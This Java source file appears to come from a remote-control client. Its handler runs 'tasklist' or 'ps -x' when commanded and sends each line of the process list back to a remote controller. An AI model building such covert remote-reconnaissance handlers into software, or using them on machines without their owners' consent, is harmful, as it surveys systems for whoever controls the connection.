package com.redpois0n.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;
import com.redpois0n.packets.outgoing.Header;


public class PacketLISTPROCESS extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			Process p = null;
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
			} else {
				p = Runtime.getRuntime().exec("ps -x");
			}
			
			if (p != null) {
				BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;
				
				while ((line = input.readLine()) != null) {
					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
						if (!line.trim().equals("")) {
							Connection.addToSendQueue(new PacketBuilder(Header.PROCESS, line));
						}
					} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
						Connection.addToSendQueue(new PacketBuilder(Header.PROCESS, line));
					}
				}
				input.close();
			}
		} catch (Exception err) {
			err.printStackTrace();
		}
	}

}
